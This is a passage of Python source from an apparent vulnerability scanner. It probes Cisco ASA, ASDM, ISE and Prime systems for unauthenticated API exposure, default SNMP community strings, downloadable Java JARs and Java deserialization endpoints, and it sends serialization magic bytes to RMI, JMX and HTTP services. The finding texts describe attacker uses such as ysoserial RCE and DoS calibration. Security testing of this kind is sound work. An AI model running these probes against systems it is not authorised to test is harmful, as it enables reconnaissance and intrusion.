        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_ACTIVE_CONNECTIONS_UNAUTH',
            'detail': (
                f'ASA REST API /api/monitoring/connections on {host}:{port} '
                f'returned HTTP 200 unauthenticated ({len(body2)} bytes).  '
                f'ch11 / ch12: active connection table exposes all live TCP/UDP '
                f'sessions with full 5-tuple -- internal host IPs, external peers, '
                f'ports, and protocols in real time without credentials.  '
                f'Response excerpt: {body2[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Parse for unique source/dest IP pairs
        conn_ips = re.findall(
            r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
            body2,
        )
        unique_conn_ips = list(dict.fromkeys(conn_ips))
        if len(unique_conn_ips) >= 2:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_CONNECTION_TABLE_DISCLOSED',
                'detail': (
                    f'{len(unique_conn_ips)} unique IP addresses extracted from '
                    f'active connection table on {host}:{port}: '
                    f'{unique_conn_ips[:20]}.  '
                    f'ch12: connection table discloses internal client IPs, '
                    f'server IPs, and all active sessions -- enables real-time '
                    f'target enumeration and traffic pattern analysis without '
                    f'authenticating to the firewall.'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 3: NAT translation (xlate) table -------------------------------
    # ch12 (show xlate debug) / ch08 (NAT): xlate table records all active
    # NAT translations including dynamic PAT entries.  Unauth read exposes
    # every active real-to-mapped translation in real time.
    sc3, body3 = _api_get('/api/monitoring/xlate')
    if sc3 == 200 and body3:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_XLATE_TABLE_UNAUTH',
            'detail': (
                f'ASA REST API /api/monitoring/xlate on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body3)} bytes).  '
                f'ch12 (show xlate debug) / ch08: NAT translation table exposed -- '
                f'records all active address and port translations (static NAT, '
                f'dynamic NAT, PAT) in real time without credentials.  '
                f'Response excerpt: {body3[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Parse for all active NAT translation pairs
        xlate_real = re.findall(
            r'"(?:originalAddress|localAddress|inside|real)"\s*:\s*"([^"]{4,50})"',
            body3, re.IGNORECASE,
        )
        xlate_mapped = re.findall(
            r'"(?:translatedAddress|globalAddress|outside|mapped)"\s*:\s*"([^"]{4,50})"',
            body3, re.IGNORECASE,
        )
        if xlate_real or xlate_mapped:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASA_NAT_XLATE_PAIRS',
                'detail': (
                    f'Active NAT translation pairs from xlate table on {host}:{port}: '
                    f'real={xlate_real[:10]}, mapped={xlate_mapped[:10]}.  '
                    f'ch08 (Dynamic NAT / PAT): xlate entries disclose every currently '
                    f'active real-to-mapped pair including ephemeral PAT port '
                    f'assignments -- enables real-time tracking of which internal '
                    f'hosts are communicating and their current external addresses.'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 4: interface traffic counters ----------------------------------
    # ch11: interface statistics include input/output packet counts, byte
    # rates, error counters, and CRC counts.  Exposed stats disclose traffic
    # volume and error rates per interface without credentials.
    sc4, body4 = _api_get('/api/monitoring/traffic')
    if sc4 == 200 and body4:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASA_TRAFFIC_STATS_UNAUTH',
            'detail': (
                f'ASA REST API /api/monitoring/traffic on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body4)} bytes).  '
                f'ch11: interface traffic counters expose per-interface input/output '
                f'packet rates, byte counts, error rates, and CRC counters -- '
                f'discloses traffic volume and interface utilization without '
                f'credentials, enabling capacity-based DoS targeting.  '
                f'Response excerpt: {body4[:300]!r}'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 5: SNMP connection OIDs ----------------------------------------
    # ch11: ASA SNMP MIB ciscoFirewallMIB (1.3.6.1.4.1.9.9.147) exposes
    # connection table counters.  Queried with default community strings.
    # OID .1.2.2.2.1.5 = cfwConnStatValue (conn limit per service)
    # OID .1.2.2.2.1.4 = cfwConnStatCount (current active connections)
    _asa_snmp_oids = [
        ('1.3.6.1.4.1.9.9.147.1.2.2.2.1.5', 'ASA_CONN_LIMIT_VIA_SNMP', 'HIGH',
         'Connection limit (cfwConnStatValue) via SNMP on {host}:{port} '
         '(community={comm!r}): value={val}.  '
         'ch11 (Connection Limits on ASA): connection limit OID discloses '
         'the configured per-service connection cap -- enables DoS calibration '
         'to hit the exact limit without triggering threshold-based alerting.'),
        ('1.3.6.1.4.1.9.9.147.1.2.2.2.1.4', 'ASA_CONN_COUNT_VIA_SNMP', 'HIGH',
         'Current connection count (cfwConnStatCount) via SNMP on {host}:{port} '
         '(community={comm!r}): value={val}.  '
         'ch11: active connection count OID discloses real-time session count -- '
         'reveals current load and headroom before connection-limit DoS threshold, '
         'accessible without REST credentials via default SNMP community string.'),
    ]
    for snmp_oid, snmp_title, snmp_sev, snmp_tmpl in _asa_snmp_oids:
        for comm in ('public', 'private', 'cisco'):
            val = _snmp_int_query(host, comm, snmp_oid,
                                  snmp_timeout=min(timeout, 3.0))
            if val is not None:
                findings.append({
                    'severity': snmp_sev,
                    'title': snmp_title,
                    'detail': snmp_tmpl.format(host=host, port=161,
                                               comm=comm, val=val),
                    'host': host,
                    'port': 161,
                })
                break

    # -- Probe 6: ARP table ---------------------------------------------------
    # ARP table maps MAC addresses to IP addresses per interface.  Unauth
    # read exposes the full Layer-2 topology -- every directly connected host
    # on each ASA interface segment.
    sc6, body6 = _api_get('/api/monitoring/arp')
    if sc6 == 200 and body6:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_ARP_TABLE_UNAUTH',
            'detail': (
                f'ASA REST API /api/monitoring/arp on {host}:{port} returned '
                f'HTTP 200 unauthenticated ({len(body6)} bytes).  '
                f'ARP table exposed -- maps MAC addresses to IP addresses per '
                f'interface, disclosing the complete Layer-2 topology of all '
                f'directly connected segments without credentials.  '
                f'Response excerpt: {body6[:400]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Parse for MAC-to-IP mappings
        mac_hits = re.findall(
            r'\b(?:[0-9a-fA-F]{2}[:\-.]){5}[0-9a-fA-F]{2}\b',
            body6,
        )
        arp_ips = re.findall(
            r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
            body6,
        )
        if mac_hits or arp_ips:
            unique_macs = list(dict.fromkeys(mac_hits))
            unique_arp_ips = list(dict.fromkeys(arp_ips))
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_ARP_TOPOLOGY_DISCLOSED',
                'detail': (
                    f'ARP topology extracted from /api/monitoring/arp on '
                    f'{host}:{port}: {len(unique_macs)} MAC(s) '
                    f'{unique_macs[:10]}, {len(unique_arp_ips)} IP(s) '
                    f'{unique_arp_ips[:15]}.  '
                    f'MAC-to-IP mappings disclose device vendors (via OUI), '
                    f'host counts per segment, and physical layer topology; '
                    f'combined with connection table, enables full L2/L3 '
                    f'network reconstruction without credentials.'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_asa_asdm_jar_exposure(host, port=443, timeout=10.0) -> list:
    """Detect Cisco ASDM Java applet download and fingerprinting attack surface.

    Synthesized from: Decompiling Java (Apress), ch2 (Ghost in the Machine),
    ch3 (Tools of the Trade), ch4 (Protecting Your Source).

    ch2 (Classfile Format + JVM Design): Java classfiles begin with magic bytes
    0xCAFEBABE; JAR files are ZIP archives (PK magic 0x504B0304) containing
    compiled classfiles.  The constant pool in every classfile stores string
    literals, class/method references, and numeric constants in cleartext --
    after decompilation the recovered source is nearly identical to the original
    except for programmer comments.  ASDM classfiles therefore disclose internal
    ASA hostnames, auth tokens, API endpoints, and management logic verbatim.

    ch3 (Applet Domain Restriction): ASDM uses getDocumentBase().getHost() to
    restrict execution to the serving ASA hostname; this string value is stored
    in the classfile constant pool and recovered trivially by javap or any hex
    editor.  The TLS certificate CN is the same value baked into the applet.

    ch4 (JDBC Credential Exposure): credentials and internal API endpoints
    stored in classfile string constants survive decompilation intact -- the
    Apress example of updateS**t() methods in production classfiles illustrates
    how sensitive logic is preserved in bytecode with full symbolic fidelity.

    JNLP (Java Network Launch Protocol): XML descriptor that lists JAR files
    (jar href=) and launch <argument> values used to bootstrap the ASDM applet;
    each referenced JAR is independently downloadable and decompilable.

    Endpoints probed:
      HTTPS GET /admin/public/index.html    -- ASDM launch page
      HTTPS GET /admin/public/asdm.jnlp     -- JNLP descriptor
      HTTPS GET /+CSCOU+/asdm-launcher.jar  -- launcher JAR (PK magic check)
      HTTPS GET /admin/public/asdm-version.txt -- version file
      HTTPS GET /+CSCOU+/ccmadmin.zip       -- Cisco UCM admin download
      HTTPS GET /+CSCOU+/ccmuser.zip        -- Cisco UCM user download
      TLS cert CN scan                       -- internal hostname disclosure
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': 'Mozilla/5.0 JNLP/7.0 Java/1.8.0_361',
                'Accept': '*/*',
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read()
                hdrs = dict(r.headers)
                return r.status, body, hdrs
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read()
            except Exception:
                pass
            return e.code, body, {}
        except Exception:
            return None, b'', {}

    # -- Probe 1: /admin/public/index.html -- ASDM launch page ------------------
    # ch3 (Problem of Insecure Code): ASDM launch page exposes the applet
    # deployment surface without requiring authentication; version string in HTML
    # allows targeted mapping to Cisco PSIRT advisories and exploit modules.
    sc1, body1, _ = _get('/admin/public/index.html')
    if sc1 == 200 and len(body1) > 0:
        text1 = body1.decode('utf-8', errors='replace')
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASDM_LAUNCH_PAGE_EXPOSED',
            'detail': (
                f'ASDM launch page at {host}:{port}/admin/public/index.html '
                f'returned HTTP {sc1} ({len(body1)} bytes) without authentication.  '
                f'ch3: ASDM Java applet deployment surface accessible unauthenticated; '
                f'page leaks ASDM version, ASA hostname, and JNLP launch descriptor '
                f'URL enabling targeted applet download and decompilation.  '
                f'Excerpt: {text1[:200]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Parse for ASDM version string in HTML
        ver_match = re.search(
            r'(?i)asdm[^\d]{0,20}(\d+\.\d+(?:\.\d+)?(?:\(\d+\))?)',
            text1,
        )
        if not ver_match:
            ver_match = re.search(
                r'(?i)version[^\d]{0,10}(\d+\.\d+(?:\.\d+)?(?:\(\d+\))?)',
                text1,
            )
        if ver_match:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASDM_VERSION_DISCLOSED',
                'detail': (
                    f'ASDM version "{ver_match.group(1)}" parsed from '
                    f'{host}:{port}/admin/public/index.html HTML.  '
                    f'ch2 (Constant Pool): version strings are stored as UTF8 '
                    f'constants in the classfile constant pool and survive '
                    f'decompilation intact; discloses exact patch level for '
                    f'Cisco PSIRT advisory CVE targeting.  '
                    f'Context: {text1[max(0, ver_match.start()-30):ver_match.end()+30]!r}'
                ),
                'host': host,
                'port': port,
            })

        # Parse for <version> in JNLP reference embedded in HTML
        jnlp_ver_match = re.search(
            r'<version>\s*([^<]{1,40})\s*</version>',
            text1, re.IGNORECASE,
        )
        if jnlp_ver_match:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASDM_JNLP_VERSION',
                'detail': (
                    f'JNLP <version> tag "{jnlp_ver_match.group(1)}" parsed from '
                    f'{host}:{port}/admin/public/index.html.  '
                    f'ch2 (Classfile Format): JNLP version pinning exposes exact '
                    f'ASDM build string; maps directly to Cisco PSIRT advisory '
                    f'version ranges for targeted CVE exploitation of the applet '
                    f'or the serving ASA firmware.'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 2: /admin/public/asdm.jnlp -- JNLP descriptor -------------------
    # ch2 (Classfile Format): JNLP <jar href=> lists every JAR the applet loads;
    # <argument> tags carry runtime parameters including ASA hostname/IP and
    # session bootstrap values; downloadable without auth if path not gated.
    sc2, body2, _ = _get('/admin/public/asdm.jnlp')
    if sc2 == 200 and len(body2) > 0:
        text2 = body2.decode('utf-8', errors='replace')
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASDM_JNLP_DOWNLOADABLE',
            'detail': (
                f'ASDM JNLP descriptor at {host}:{port}/admin/public/asdm.jnlp '
                f'returned HTTP {sc2} ({len(body2)} bytes) without authentication.  '
                f'ch2: JNLP descriptor lists all JAR files required by the ASDM '
                f'applet; each JAR is a decompilable ZIP archive of classfiles '
                f'containing full symbolic information (class names, string constants, '
                f'method signatures).  Excerpt: {text2[:300]!r}'
            ),
            'host': host,
            'port': port,
        })

        # Parse jar href= entries
        jar_hrefs = re.findall(
            r'<jar[^>]+href=["\']([^"\']+\.jar)["\']', text2, re.IGNORECASE,
        )
        if jar_hrefs:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASDM_JAR_MANIFEST',
                'detail': (
                    f'ASDM JNLP at {host}:{port} lists {len(jar_hrefs)} JAR '
                    f'file(s): {jar_hrefs[:10]}.  '
                    f'ch2 (Stack Machine + Dynamic Loading): each JAR is a ZIP '
                    f'archive of bytecode classfiles; javap or any Java decompiler '
                    f'recovers class names, method signatures, and string literals '
                    f'(credentials, endpoints, API keys) from the constant pool '
                    f'without access to original source code.'
                ),
                'host': host,
                'port': port,
            })

        # Parse <argument> tags for launch parameters
        args = re.findall(r'<argument>([^<]{1,200})</argument>', text2, re.IGNORECASE)
        if args:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASDM_LAUNCH_ARGS',
                'detail': (
                    f'ASDM JNLP at {host}:{port} contains {len(args)} <argument> '
                    f'tag(s): {args[:8]}.  '
                    f'ch3 (Applet Domain Restriction): launch arguments include '
                    f'ASA hostname/IP, session tokens, and connection parameters '
                    f'used by the ASDM applet to establish management session; '
                    f'discloses internal addressing and session bootstrap data '
                    f'without requiring applet decompilation.'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 3: /+CSCOU+/asdm-launcher.jar -- ASDM launcher JAR --------------
    # ch2 (JVM Design): JAR files are ZIP archives beginning with PK magic bytes
    # 0x504B0304; classfiles within begin with 0xCAFEBABE; decompilable with
    # javap -c or any Java decompiler to recover management auth logic, embedded
    # credentials, and internal endpoint strings from the constant pool.
    sc3, body3, hdrs3 = _get('/+CSCOU+/asdm-launcher.jar')
    if sc3 == 200 and len(body3) >= 4:
        cl3 = hdrs3.get('Content-Length', hdrs3.get('content-length', str(len(body3))))
        if body3[:4] == b'PK\x03\x04':
            findings.append({
                'severity': 'CRITICAL',
                'title': 'ASDM_LAUNCHER_JAR_DOWNLOADABLE',
                'detail': (
                    f'ASDM launcher JAR at {host}:{port}/+CSCOU+/asdm-launcher.jar '
                    f'returned HTTP {sc3} with PK ZIP magic header confirmed '
                    f'(0x{body3[:4].hex()}); Content-Length: {cl3} bytes.  '
                    f'ch2 (Classfile Format): JAR contains bytecode classfiles with '
                    f'CAFEBABE magic; javap/decompiler recovers ASA management auth '
                    f'logic, hard-coded endpoints, and embedded string constants '
                    f'(passwords, API keys, certificates) from constant pool.'
                ),
                'host': host,
                'port': port,
            })
        else:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASDM_LAUNCHER_JAR_DOWNLOADABLE',
                'detail': (
                    f'ASDM launcher JAR path at '
                    f'{host}:{port}/+CSCOU+/asdm-launcher.jar '
                    f'returned HTTP {sc3} ({cl3} bytes); PK magic not confirmed '
                    f'(first 4 bytes: 0x{body3[:4].hex()}).  May be partial '
                    f'response, redirect body, or alternate encoding.'
                ),
                'host': host,
                'port': port,
            })
    elif sc3 == 200 and len(body3) > 0:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASDM_LAUNCHER_JAR_DOWNLOADABLE',
            'detail': (
                f'ASDM launcher JAR path {host}:{port}/+CSCOU+/asdm-launcher.jar '
                f'returned HTTP {sc3} but response body < 4 bytes ({len(body3)}).'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 4: /admin/public/asdm-version.txt -- version disclosure ----------
    sc4, body4, _ = _get('/admin/public/asdm-version.txt')
    if sc4 == 200 and len(body4) > 0:
        text4 = body4.decode('utf-8', errors='replace').strip()
        findings.append({
            'severity': 'HIGH',
            'title': 'ASDM_VERSION_FILE',
            'detail': (
                f'ASDM version file at '
                f'{host}:{port}/admin/public/asdm-version.txt '
                f'returned HTTP {sc4}: {text4[:200]!r}.  '
                f'ch4 (Fingerprinting Code): version disclosure enables targeted '
                f'Cisco PSIRT advisory lookup; exact ASDM build string maps to '
                f'patched/unpatched state for known authentication bypass and '
                f'deserialization CVEs (e.g. CVE-2021-1585, CVE-2023-20269).'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 5: Cisco UCM Java downloads via CSCOU path -----------------------
    for ucm_path, ucm_label in [
        ('/+CSCOU+/ccmadmin.zip', 'ccmadmin'),
        ('/+CSCOU+/ccmuser.zip', 'ccmuser'),
    ]:
        sc5, body5, _ = _get(ucm_path)
        if sc5 == 200 and len(body5) > 0:
            pk_confirmed = len(body5) >= 4 and body5[:4] == b'PK\x03\x04'
            sev5 = 'HIGH' if pk_confirmed else 'MEDIUM'
            findings.append({
                'severity': sev5,
                'title': 'ASA_CISCO_UCM_DOWNLOAD',
                'detail': (
                    f'Cisco UCM Java download ({ucm_label}) at '
                    f'{host}:{port}{ucm_path} returned HTTP {sc5} '
                    f'({len(body5)} bytes); PK magic: {pk_confirmed}.  '
                    f'ch3 (Tools of the Trade): UCM ZIP contains Java classfiles '
                    f'decompilable to recover CUCM internal auth tokens, admin '
                    f'credentials, management API endpoints, and inter-component '
                    f'shared secrets from classfile constant pools.'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 6: TLS cert CN -- internal hostname disclosure -------------------
    # ch3 (Applet Domain Restriction): ASDM applet validates the serving domain
    # via getDocumentBase().getHost(); the TLS cert CN/SAN is the hostname value
    # baked into the ASDM classfile constant pool.  Internal names in the cert
    # (RFC1918, *.local, *.corp, device naming) disclose management plane
    # naming convention and enable targeted phishing and zone enumeration.
    try:
        with socket.create_connection((host, port), timeout=timeout) as raw_sock:
            with ctx.wrap_socket(raw_sock, server_hostname=host) as ssl_sock:
                cert_der = ssl_sock.getpeercert(binary_form=True)
        if cert_der:
            # Locate Subject CN by scanning for OID 2.5.4.3 = 55 04 03 in DER
            cn_val = ''
            idx = 0
            while idx < len(cert_der) - 6:
                if cert_der[idx:idx+3] == b'\x55\x04\x03':
                    tag_off = idx + 3
                    cn_tag = cert_der[tag_off]
                    if cn_tag in (0x0c, 0x13, 0x1e, 0x16) and tag_off + 1 < len(cert_der):
                        raw_len = cert_der[tag_off + 1]
                        if raw_len & 0x80:
                            nb = raw_len & 0x7f
                            if tag_off + 2 + nb <= len(cert_der):
                                cn_len = int.from_bytes(
                                    cert_der[tag_off+2:tag_off+2+nb], 'big'
                                )
                                val_off = tag_off + 2 + nb
                            else:
                                idx += 1
                                continue
                        else:
                            cn_len = raw_len
                            val_off = tag_off + 2
                        if val_off + cn_len <= len(cert_der):
                            cn_val = cert_der[val_off:val_off+cn_len].decode(
                                'utf-8', errors='replace'
                            )
                            break
                idx += 1

            if cn_val:
                internal_pats = [
                    r'(?i)(\.local|\.corp|\.internal|\.lan|\.intranet|\.home)$',
                    r'^(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d+\.\d+$',
                    r'(?i)(?:asa|asdm|fw|firewall|vpn|mgmt|mgm|admin|ciscovpn)',
                ]
                is_internal = any(re.search(p, cn_val) for p in internal_pats)
                sev_cert = 'CRITICAL' if is_internal else 'INFO'
                findings.append({
                    'severity': sev_cert,
                    'title': 'ASDM_CERT_HOSTNAME_LEAKED',
                    'detail': (
                        f'TLS certificate CN={cn_val!r} from {host}:{port}.  '
                        f'ch3: ASDM classfile embeds the ASA hostname via '
                        f'getDocumentBase().getHost() in constant pool; TLS CN '
                        f'is the authoritative identity value.  '
                        f'Internal hostname indicators: {is_internal}.  '
                        f'Discloses management plane naming, enables targeted '
                        f'phishing with plausible hostname, and maps internal '
                        f'zone structure from a single unauthenticated TLS '
                        f'connection.'
                    ),
                    'host': host,
                    'port': port,
                })
    except Exception:
        pass

    return findings


def probe_cisco_java_deserialization_surface(host, port=443, timeout=10.0) -> list:
    """Detect Java deserialization attack surface in Cisco Java-based management apps.

    Synthesized from: Decompiling Java (Apress), ch2 (Ghost in the Machine),
    ch3 (Tools of the Trade), ch4 (Protecting Your Source).

    ch2 (JVM Stack Machine + Simple Stack Machine Design): Java object
    serialization uses a binary wire protocol beginning with STREAM_MAGIC
    0xACED and STREAM_VERSION 0x0005; any endpoint that accepts and deserializes
    this stream without type-checking is exploitable via gadget chains (ysoserial
    CommonsCollections1-7, Spring1-2, etc.).  The JVM's classfile design --
    designed for portability and security audit -- makes gadget class enumeration
    trivial via decompilation.

    ch3 (Hex Editor + Tools of Trade): Java RMI registry on TCP/1099 uses the
    JRMP wire protocol beginning with 0x4A524D49 ("JRMI"); server response with
    STREAM_MAGIC (0x4E, 0x01) in the JRMP header confirms an active
    deserialization endpoint.  T3 (WebLogic/Cisco UCS inter-component protocol)
    also operates over a full Java serialization channel on TCP/7001.

    ch4 (JDBC Credential Exposure + Native Methods Bypass): Cisco management
    planes (ISE, Prime Infrastructure, UCS) are Java EE applications; their
    JMX/RMI management interfaces and HTTP deserialization endpoints accept
    serialized objects; library classpath analysis (via JAR decompilation)
    determines gadget chain viability.  JSF ViewState is a base64-encoded
    serialized Java object susceptible to injection when unsigned.

    Ports and endpoints probed:
      TCP/1099        -- Java RMI default registry (JRMI magic)
      TCP/9999        -- JMX default port
      TCP/7199        -- Cassandra JMX
      TCP/11099       -- IIOP/JMX alternate
      TCP/8686        -- GlassFish JMX
      HTTPS POST /invoke -- HTTP Java serialization content-type probe
      HTTPS GET /admin/API/mnt/Version -- Cisco ISE Java stack trace
      HTTPS GET /webacs/pages/common/login.jsf -- Cisco Prime JSF
      TCP/7001,9043,4848 -- WebLogic/Cisco UCS T3 protocol
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _http_get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*',
            },
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    def _tcp_probe(t_host, t_port, send_data, recv_bytes=64):
        """Open raw TCP connection, send data, return (connected, response_bytes)."""
        try:
            with socket.create_connection((t_host, t_port), timeout=timeout) as s:
                s.sendall(send_data)
                resp = b''
                try:
                    s.settimeout(timeout)
                    resp = s.recv(recv_bytes)
                except Exception:
                    pass
                return True, resp
        except Exception:
            return False, b''

    # -- Probe 1: Java RMI registry TCP/1099 ------------------------------------
    # ch3 (Hex Editor manipulation): RMI registry on TCP/1099 speaks the JRMP
    # wire protocol; JRMI magic + SingleOpProtocol header initiates handshake;
    # STREAM_MAGIC 0x4E01 in response confirms active Java object deserialization
    # endpoint exploitable via ysoserial gadget chains without authentication.
    RMI_MAGIC = b'JRMI\x00\x02\x4b'  # JRMI + protocol 2 + SingleOpProtocol (K)
    connected1, resp1 = _tcp_probe(host, 1099, RMI_MAGIC)
    if connected1:
        findings.append({
            'severity': 'HIGH',
            'title': 'JAVA_RMI_PORT_OPEN',
            'detail': (
                f'Java RMI registry TCP/1099 accepted connection on {host}.  '
                f'ch3: RMI registry transmits serialized Java objects over JRMP '
                f'wire protocol; unauthenticated registry lookup exposes bound '
                f'service names and object references; enables ysoserial '
                f'gadget-chain deserialization attack if vulnerable classpath '
                f'libraries present.  Response (hex): {resp1[:32].hex()!r}'
            ),
            'host': host,
            'port': 1099,
        })
        # STREAM_MAGIC 0x4e + STREAM_VERSION 0x01 in JRMP response header
        if len(resp1) >= 2 and resp1[:2] == b'\x4e\x01':
            findings.append({
                'severity': 'CRITICAL',
                'title': 'JAVA_RMI_DESERIALIZ_SURFACE',
                'detail': (
                    f'Java RMI on {host}:1099 returned JRMP STREAM_MAGIC '
                    f'0x4e01 confirming active Java object deserialization '
                    f'on the wire.  '
                    f'ch2 (JVM Stack Machine): serialized object streams begin '
                    f'with 0xACED0005; JRMP uses 0x4e01; both indicate live '
                    f'deserialization; ysoserial CommonsCollections/Spring gadget '
                    f'chains deliver RCE without authentication.  '
                    f'Full response (hex): {resp1[:64].hex()!r}'
                ),
                'host': host,
                'port': 1099,
            })

    # -- Probe 2: JMX ports 9999, 7199, 11099, 8686 ----------------------------
    # ch4 (Native Methods Bypass): JMX exposes management MBeans over RMI/JRMP;
    # default JMX configurations in Cisco management plane components are
    # unauthenticated; MBean invocation enables exec, file read, and credential
    # extraction; JRMP channel = Java serialization pipe.
    JMX_PORTS = [
        (9999,  'JMX default'),
        (7199,  'Cassandra JMX'),
        (11099, 'IIOP/JMX alternate'),
        (8686,  'GlassFish JMX'),
    ]
    JMX_HANDSHAKE = b'JRMI\x00\x02\x4b'
    for jmx_port, jmx_label in JMX_PORTS:
        conn_j, resp_j = _tcp_probe(host, jmx_port, JMX_HANDSHAKE)
        if conn_j:
            stream_magic = len(resp_j) >= 2 and resp_j[:2] == b'\x4e\x01'
            sev_j = 'CRITICAL' if stream_magic else 'HIGH'
            findings.append({
                'severity': sev_j,
                'title': 'JMX_PORT_OPEN',
                'detail': (
                    f'JMX/RMI port {jmx_port} ({jmx_label}) accepted connection '
                    f'on {host}.  '
                    f'ch3 (Tools of the Trade): JMX over RMI/JRMP transmits '
                    f'serialized Java objects; unauthenticated JMX access enables '
                    f'MBean invocation (createMBean/invoke), file read, and '
                    f'deserialization gadget-chain injection.  '
                    f'STREAM_MAGIC 0x4e01 in response: {stream_magic}.  '
                    f'Response (hex): {resp_j[:32].hex()!r}'
                ),
                'host': host,
                'port': jmx_port,
            })

    # -- Probe 3: HTTP Java serialization content-type endpoint -----------------
    # ch2 (Dynamic Class Loading): Java EE applications may expose HTTP endpoints
    # accepting Content-Type: application/x-java-serialized-object; server
    # returning 500 indicates the object was deserialized before type validation
    # failed; 200 = fully processed; 400 = rejected at HTTP layer (not deser'd).
    # Payload: STREAM_MAGIC(0xACED) + STREAM_VERSION(0x0005) + TC_NULL(0x70)
    SER_MAGIC = b'\xac\xed\x00\x05'
    SER_PAYLOAD = SER_MAGIC + b'\x70'  # TC_NULL terminal object
    deser_url = f'{base}/invoke'
    deser_req = urllib.request.Request(
        deser_url,
        data=SER_PAYLOAD,
        method='POST',
        headers={
            'Content-Type': 'application/x-java-serialized-object',
            'User-Agent': 'Java/1.8.0',
            'Content-Length': str(len(SER_PAYLOAD)),
        },
    )
    sc3_deser = None
    body3_deser = ''
    try:
        with urllib.request.urlopen(deser_req, timeout=timeout, context=ctx) as r3:
            sc3_deser = r3.status
            body3_deser = r3.read().decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e3:
        sc3_deser = e3.code
        try:
            body3_deser = e3.read().decode('utf-8', errors='replace')
        except Exception:
            pass
    except Exception:
        pass

    if sc3_deser in (200, 500):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'JAVA_DESERIALIZ_ENDPOINT',
            'detail': (
                f'POST /invoke at {host}:{port} with '
                f'Content-Type: application/x-java-serialized-object and '
                f'STREAM_MAGIC payload (0xaced0005) returned HTTP {sc3_deser} '
                f'(200/500 = deserialized; 400 = rejected at HTTP layer).  '
                f'ch2 (Dynamic Loading): server consumed the serialization '
                f'stream; RCE via ysoserial gadget chain (CommonsCollections1-7, '
                f'Spring1-2, Groovy1) if vulnerable library is on classpath -- '
                f'confirm classpath via JNLP JAR list decompilation.  '
                f'Response excerpt: {body3_deser[:200]!r}'
            ),
            'host': host,
            'port': port,
        })

    # -- Probe 4: Cisco ISE /admin/API/mnt/Version -- Java stack trace ----------
    # ch4 (JDBC Exposure): ISE is a Java EE Spring/Hibernate application; Java
    # exception stack traces in error responses disclose class names, package
    # paths, library versions, and Spring bean structure -- equivalent to reading
    # the classfile constant pool for the running application.
    sc4, body4 = _http_get('/admin/API/mnt/Version')
    if sc4 is not None and len(body4) > 0:
        java_trace_pat = re.search(
            r'(?i)('
            r'java\.(?:lang|io|util|net|sql)\.\w+Exception'
            r'|at [a-z][\w\.]+\([A-Za-z]+\.java:\d+\)'
            r'|javax\.\w+\.\w+'
            r'|org\.springframework\.\w+'
            r')',
            body4,
        )
        if java_trace_pat:
            findings.append({
                'severity': 'HIGH',
                'title': 'ISE_JAVA_STACK_TRACE',
                'detail': (
                    f'Cisco ISE {host}:{port}/admin/API/mnt/Version '
                    f'(HTTP {sc4}) returned Java class reference or stack trace: '
                    f'{java_trace_pat.group(0)!r}.  '
                    f'ch4: stack traces expose internal package structure, library '
                    f'versions, and Spring bean class names identical to what '
                    f'JAR decompilation recovers; confirms ISE JVM runtime is '
                    f'verbose and exception filtering is absent.  '
                    f'Excerpt: {body4[:300]!r}'
                ),
                'host': host,
                'port': port,
            })
        elif sc4 == 200:
            findings.append({
                'severity': 'INFO',
                'title': 'ISE_VERSION_API_EXPOSED',
                'detail': (
                    f'Cisco ISE /admin/API/mnt/Version at {host}:{port} '
                    f'returned HTTP {sc4} ({len(body4)} bytes) without '
                    f'authentication; no Java stack trace detected.  '
                    f'Excerpt: {body4[:200]!r}'
                ),
                'host': host,
                'port': port,
            })

    # -- Probe 5: Cisco Prime Infrastructure /webacs/pages/common/login.jsf ----
    # ch2 (Symbolic Info in Classfiles): JSF (JavaServer Faces) is the Java EE
